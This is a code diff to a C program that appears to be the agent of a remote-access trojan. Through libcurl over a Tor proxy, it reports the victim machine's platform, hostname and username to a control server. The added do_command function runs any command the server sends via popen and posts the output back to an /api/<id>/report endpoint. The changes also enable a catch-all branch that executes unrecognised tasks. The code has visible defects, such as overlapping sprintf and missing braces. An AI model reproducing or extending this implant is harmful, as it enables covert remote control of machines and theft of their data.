@@ -14,6 +14,10 @@ struct url_data {
     size_t size;
     char* data;
 };
+struct write_this {
+  const char *readptr;
+  size_t sizeleft;
+};
 char *UID;
 char *PLATFORM;
 char *HOSTNAME;
@@ -43,17 +47,20 @@ char* get_command(char* todo)
 
 char* get_args(char* todo)
 {
-		char *args;
-		for (args = todo; *args && *args != ' ' ;args++)
-    {
-				if (*args) args++;
-    }
-		return args;
+    char *todo_temp = malloc(strlen(todo)+1);
+    strcpy(todo_temp,todo);
+    const char ch = ' ';
+    char *ret;
+    ret = strchr(todo_temp, ch);
+    ret++;
+    return ret;
 }
 
 int get_args_len(char* todo)
 {
-    char *token = strtok(todo, " ");
+    char *todo_temp = malloc(BUFFER_SIZE);
+    strcpy(todo_temp,todo);
+    char *token = strtok(todo_temp, " ");
 		int count = 0;
     while (token != NULL)
     {
@@ -117,7 +124,7 @@ size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
     size_t n = (size * nmemb);
     char* tmp;
     data->size += (size * nmemb);
-    tmp = realloc(data->data, data->size + 1); /* +1 for '\0' */
+    tmp = realloc(data->data, data->size + 1);
     if(tmp){
         data->data = tmp;
     }
@@ -180,16 +187,24 @@ char* post_request(char *path, char *post_data, bool json)
         strcpy(url, URL);
         strcat(url, path);
         struct curl_slist *headers = NULL;
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
         if(json)
         {
             headers = curl_slist_append(headers, "Accept: application/json");
             headers = curl_slist_append(headers, "Content-Type: application/json");
             headers = curl_slist_append(headers, "charset: utf-8");
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
         }
-        curl_easy_setopt(curl, CURLOPT_URL, url);
-        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+        else
+        {
+            curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L);
+            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(post_data)+1);
+        }
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
         res = curl_easy_perform(curl);
@@ -205,7 +220,7 @@ char* post_request(char *path, char *post_data, bool json)
 * ------------------------------------------------------------------------ */
 char* send_output(char* output, bool newlines)
 {
-    char *output_temp = malloc(BUFFER_SIZE);
+    char *output_temp = malloc(strlen(output)+BUFFER_SIZE);
     if(output!= NULL && output[0] == '\0') return "";
     if(newlines)
     {
@@ -214,7 +229,7 @@ char* send_output(char* output, bool newlines)
     }
     else strcpy(output_temp,output);
     char *path = malloc(BUFFER_SIZE);
-    char *post_data = malloc(BUFFER_SIZE);
+    char *post_data = malloc(strlen(output_temp)+BUFFER_SIZE);
     sprintf(path, "/api/%s/report", get_unique_id());
     sprintf(post_data,"output=%s",output_temp);
     return post_request(path, post_data, false);
@@ -231,6 +246,36 @@ char* say_hello()
              \"username\": \"%s\"}",
             PLATFORM,HOSTNAME,USERNAME);
     return post_request(path, post_data, true);
+}
+
+void do_command(char* command)
+{
+    command = realloc(command, strlen(command)+BUFFER_SIZE);
+    printf("%s",command);
+    sprintf(command, "%s 2>&1", command);
+    char buffer[BUFFER_SIZE*2];
+    size_t buffer_size = BUFFER_SIZE*2;
+    char *output = malloc(BUFFER_SIZE*2);
+    FILE *f = popen(command, "r");
+    if(f == NULL)
+    {
+        perror("popen:");
+        return;
+    }
+    while(fgets(buffer, sizeof(buffer), f) != NULL) {
+        if(strlen(output) >= buffer_size-300)
+        {
+            buffer_size = buffer_size + BUFFER_SIZE*2;
+            output = realloc(output, buffer_size);
+        }
+        strcat(output, buffer);
+    }
+    output = realloc(output, strlen(output) + BUFFER_SIZE);
+    strcat(output,"\n\n");
+    printf("%lu", strlen(output));
+    printf("\n");
+    send_output(output, true);
+    pclose(f);
 }
 
 /* ----------------------------------------------------------------------- *
@@ -281,6 +326,8 @@ void run()
                 if(args_len == 0)
                     send_output("Usage: cd </path/to/directory>",true);
                 else
+                    printf("%s",get_args(todo));
+                    printf("\n");
                     chdir(get_args(todo));
             }
 /*
@@ -312,11 +359,11 @@ void run()
             {
 
             }
+*/
             else
             {
-
+                do_command(todo);
             }
-*/
         }
         else
         {
